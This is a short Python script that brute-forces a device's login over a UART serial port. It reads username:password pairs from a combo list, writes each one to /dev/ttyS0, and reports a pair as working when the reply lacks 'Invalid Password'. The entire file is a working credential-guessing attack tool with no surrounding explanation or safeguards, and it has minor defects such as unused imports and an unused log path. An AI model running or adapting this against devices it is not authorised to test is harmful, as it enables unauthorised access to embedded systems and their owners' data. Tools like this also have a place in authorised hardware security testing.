from re import TEMPLATE
import serial
import sys
from time import sleep
from os import remove

output_file = "uart_logs/uart_bruteforce_log"
combolist = "bruteforce_combo"

def check_login(baud_rate, fail_key, cred):
    ser = serial.Serial("/dev/ttyS0", baud_rate)
    username = cred.split(":")[0].strip()
    password = cred.split(":")[1].strip()
    ser.write(bytes(username, encoding="ascii"))
    ser.write(b"\r")
    ser.write(bytes(password, encoding="ascii"))
    ser.write(b"\r")
    received_data = ser.read()              #read serial port
    sleep(0.03)
    data_left = ser.inWaiting()
    received_data += ser.read(data_left)
    try:
        temp = received_data.decode("ascii")
        if fail_key in temp:
            return False
        return True
    except:
        pass 
        

def main():
    baud_rate = int(sys.argv[1])
    fail_key = "Invalid Password"
    with open(combolist, "r") as f:
        for cred in f:
            print("checking ", cred)
            if check_login(baud_rate, fail_key, cred):
                print("working ", cred)
                return cred
            else:
                print(cred, "Not working")

main()